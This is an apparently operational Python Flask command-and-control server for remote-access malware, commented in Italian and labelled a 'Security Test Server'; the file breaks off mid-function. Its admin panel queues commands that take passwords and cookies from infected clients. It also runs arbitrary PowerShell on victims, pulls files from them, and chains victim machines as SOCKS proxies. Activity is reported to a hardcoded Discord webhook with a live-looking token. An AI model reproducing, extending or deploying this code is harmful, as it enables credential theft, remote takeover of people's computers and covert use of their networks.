from flask import Flask, request, jsonify, send_file
import threading
import time
import json
import requests
from datetime import datetime
import os
import hashlib

app = Flask(__name__)

# Configurazione Discord
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"
CURRENT_VERSION = "1.3.0"  # 🆕 Versione con SOCKS proxy chain

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.next_client_id = 1
        self.lock = threading.Lock()
        self.commands_queue = {}
        self.client_fingerprints = {}
    
    def generate_fingerprint(self, client_data, ip_address):
        """Genera fingerprint unico per device"""
        fingerprint_str = f"{client_data.get('hostname','')}{ip_address}{client_data.get('username','')}"
        return hashlib.md5(fingerprint_str.encode()).hexdigest()
    
    def add_client(self, client_data, ip_address):
        with self.lock:
            fingerprint = self.generate_fingerprint(client_data, ip_address)
            
            if fingerprint in self.client_fingerprints:
                client_id = self.client_fingerprints[fingerprint]
                self.clients[client_id] = {
                    "data": client_data,
                    "last_seen": datetime.now(),
                    "ip": ip_address,
                    "fingerprint": fingerprint
                }
                return client_id
            else:
                client_id = self.next_client_id
                self.clients[client_id] = {
                    "data": client_data,
                    "last_seen": datetime.now(),
                    "ip": ip_address,
                    "fingerprint": fingerprint
                }
                self.client_fingerprints[fingerprint] = client_id
                self.next_client_id += 1
                return client_id
    
    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                fingerprint = self.clients[client_id].get("fingerprint")
                if fingerprint in self.client_fingerprints:
                    del self.client_fingerprints[fingerprint]
                del self.clients[client_id]
            if client_id in self.commands_queue:
                del self.commands_queue[client_id]
    
    def get_client(self, client_id):
        with self.lock:
            return self.clients.get(client_id)
    
    def list_clients(self):
        with self.lock:
            return self.clients.copy()
    
    def add_command(self, client_id, command):
        with self.lock:
            if client_id not in self.commands_queue:
                self.commands_queue[client_id] = []
            self.commands_queue[client_id].append(command)
    
    def get_command(self, client_id):
        with self.lock:
            if client_id in self.commands_queue and self.commands_queue[client_id]:
                return self.commands_queue[client_id].pop(0)
            return None

client_manager = ClientManager()

def send_to_discord(message, data_type="SERVER"):
    """Invia notifiche a Discord"""
    try:
        payload = {
            "content": f"🔐 **[{data_type}]** {message}",
            "username": "SecurityBot",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/6001/6001368.png"
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(DISCORD_WEBHOOK, json=payload, headers=headers, timeout=10)
        return response.status_code == 204
    except Exception as e:
        print(f"Discord error: {e}")
        return False

@app.route('/')
def home():
    clients_count = len(client_manager.list_clients())
    return f"""
    <h1>Security Test Server v{CURRENT_VERSION}</h1>
    <p>PythonAnywhere + Discord + SOCKS Proxy</p>
    <p>Client connessi: {clients_count}</p>
    <p><a href="/admin">Admin Panel</a></p>
    <p><a href="/proxy_control">🔌 Proxy Control</a></p>
    <p><a href="/api/clients">API Clients</a></p>
    """

@app.route('/admin')
def admin_panel():
    clients = client_manager.list_clients()
    clients_html = ""
    for client_id, info in clients.items():
        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")}</option>'
    
    return f'''
    <h2>Admin Control Panel v{CURRENT_VERSION}</h2>
    
    <h3>📋 Comandi Predefiniti</h3>
    <form action="/send_command" method="post">
        <label>Select Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        
        <label>Command:</label>
        <select name="command">
            <option value="passwords">Get Passwords</option>
            <option value="cookies">Get Cookies</option>
            <option value="systeminfo">System Info</option>
        </select><br><br>
        
        <button type="submit">Send Command</button>
    </form>

    <h3>⚡ PowerShell Live</h3>
    <form action="/send_powershell" method="post">
        <label>Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        
        <label>PowerShell Command:</label><br>
        <textarea name="powershell_command" rows="3" cols="50" placeholder="Enter any PowerShell command..."></textarea><br><br>
        
        <button type="submit">Execute PowerShell</button>
    </form>

    <h3>📁 File Operations</h3>
    <form action="/download_file" method="post">
        <label>Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br>
        
        <label>File Path:</label>
        <input type="text" name="file_path" placeholder="C:\path\to\file.txt" style="width: 300px;"><br><br>
        
        <button type="submit">Download File from Client</button>
    </form>

    <p><a href="/proxy_control">🔌 SOCKS Proxy Control</a></p>
    <p><a href="/upload_files">📤 Upload Files to Clients</a></p>
    <p><a href="/api/clients">View All Clients (JSON)</a></p>
    '''

# 🆕 PROXY CONTROL PANEL
@app.route('/proxy_control')
def proxy_control():
    clients = client_manager.list_clients()
    clients_html = ""
    for client_id, info in clients.items():
        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")} ({info["ip"]})</option>'
    
    return f'''
    <h2>🔌 SOCKS Proxy Control v{CURRENT_VERSION}</h2>
    
    <h3>🚀 Start SOCKS Proxy</h3>
    <form action="/api/start_socks_proxy" method="post">
        <label>Select Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br>
        
        <label>Port (default 1080):</label>
        <input type="number" name="port" value="1080"><br>
        
        <label>Next Hop (for proxy chain - optional):</label>
        <input type="text" name="next_hop" placeholder="192.168.1.100" style="width: 200px;"><br><br>
        
        <button type="submit">Start SOCKS Proxy</button>
    </form>

    <h3>🛑 Stop SOCKS Proxy</h3>
    <form action="/api/stop_socks_proxy" method="post">
        <label>Select Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        <button type="submit">Stop SOCKS Proxy</button>
    </form>

    <h3>🌐 Test Proxy Chain</h3>
    <form action="/api/test_proxy_chain" method="post">
        <label>PC1 (First Hop):</label>
        <select name="pc1_id">
            {clients_html}
        </select><br>
        
        <label>PC2 (Second Hop):</label>
        <select name="pc2_id">
            {clients_html}
        </select><br><br>
        
        <button type="submit">Test Proxy Chain</button>
    </form>

    <h3>🔍 Get Client IP</h3>
    <form action="/api/get_client_ip" method="post">
        <label>Select Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        <button type="submit">Get Public IP</button>
    </form>

    <p><a href="/admin">Back to Admin</a></p>
    '''

# 🆕 PROXY API ENDPOINTS
@app.route('/api/start_socks_proxy', methods=['POST'])
def start_socks_proxy():
    client_id = request.form.get('client_id')
    port = request.form.get('port', 1080)
    next_hop = request.form.get('next_hop')
    
    if client_id:
        command = f"start_socks|{port}|{next_hop}" if next_hop else f"start_socks|{port}"
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"🔌 SOCKS proxy avviato su client {client_id}" + (f" -> {next_hop}" if next_hop else ""))
    
    return f'''
    <h3>SOCKS Proxy Started!</h3>
    <p>Client: {client_id}</p>
    <p>Port: {port}</p>
    <p>Next Hop: {next_hop if next_hop else 'Direct'}</p>
    <a href="/proxy_control">Back to Proxy Control</a>
    '''

@app.route('/api/stop_socks_proxy', methods=['POST'])
def stop_socks_proxy():
    client_id = request.form.get('client_id')
    
    if client_id:
        client_manager.add_command(int(client_id), "stop_socks")
        send_to_discord(f"🛑 SOCKS proxy fermato su client {client_id}")
    
    return f'''
    <h3>SOCKS Proxy Stopped!</h3>
    <p>Client: {client_id}</p>
    <a href="/proxy_control">Back to Proxy Control</a>
    '''

@app.route('/api/get_client_ip', methods=['POST'])
def get_client_ip():
    client_id = request.form.get('client_id')
    
    if client_id:
        client_manager.add_command(int(client_id), "get_public_ip")
        send_to_discord(f"🔍 Richiesto IP pubblico per client {client_id}")
    
    return f'''
    <h3>IP Request Sent!</h3>
    <p>Client: {client_id}</p>
    <p>Check Discord for results</p>
    <a href="/proxy_control">Back to Proxy Control</a>
    '''

@app.route('/api/test_proxy_chain', methods=['POST'])
def test_proxy_chain():
    pc1_id = request.form.get('pc1_id')
    pc2_id = request.form.get('pc2_id')
    
    if pc1_id and pc2_id:
        # Start PC2 as direct proxy
        client_manager.add_command(int(pc2_id), "start_socks|1080")
        
        # Start PC1 as chain proxy to PC2
        pc2_data = client_manager.get_client(int(pc2_id))
        if pc2_data:
            pc2_ip = pc2_data['ip']
            client_manager.add_command(int(pc1_id), f"start_socks|1080|{pc2_ip}")
            
            send_to_discord(f"🔗 Proxy chain avviata: PC1 ({pc1_id}) -> PC2 ({pc2_id})")
            
            return f'''
            <h3>Proxy Chain Started!</h3>
            <p>PC1: {pc1_id} -> PC2: {pc2_id}</p>
            <p>Chain: PythonAnywhere → PC1 → PC2 → Internet</p>
            <a href="/proxy_control">Back to Proxy Control</a>
            '''
    
    return "Error: Clients not found"

# 🆕 GOOGLE ACCESS THROUGH PROXY CHAIN
@app.route('/access_google/<int:pc1_id>/<int:pc2_id>')
def access_google(pc1_id, pc2_id):
    """Access Google through proxy chain"""
    try:
        pc1_data = client_manager.get_client(pc1_id)
        pc2_data = client_manager.get_client(pc2_id)
        
        if not pc1_data or not pc2_data:
            return "Error: Clients not found"
        
        pc1_ip = pc1_data['ip']
        
        # Use PC1 as SOCKS proxy (which chains to PC2)
        proxies = {
            'http': f'socks5://{pc1_ip}:1080',
            'https': f'socks5://{pc1_ip}:1080'
        }
        
        # Access Google through the proxy chain
        response = requests.get('https://www.google.com', proxies=proxies, timeout=30)
        
        return response.text
        
    except Exception as e:
        return f"Error accessing Google through proxy chain: {str(e)}"

# RESTANTE CODICE SERVER INVARIATO...
@app.route('/send_command', methods=['POST'])
def send_command_web():
    client_id = request.form.get('client_id')
    command = request.form.get('command')

    if client_id and command:
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"🌐 Comando web '{command}' per client {client_id}")

    return f'''
    <h3>Command Sent!</h3>
    <p>Command: {command} to Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/send_powershell', methods=['POST'])
def send_powershell():
    client_id = request.form.get('client_id')
    powershell_command = request.form.get('powershell_command')

    if client_id and powershell_command:
        command = f"powershell_live:{powershell_command}"
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"⚡ PowerShell: {powershell_command[:100]}... per client {client_id}")

    return f'''
    <h3>PowerShell Command Sent!</h3>
    <p>Command: {powershell_command}</p>
    <p>To Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/download_file', methods=['POST'])
def download_file():
    client_id = request.form
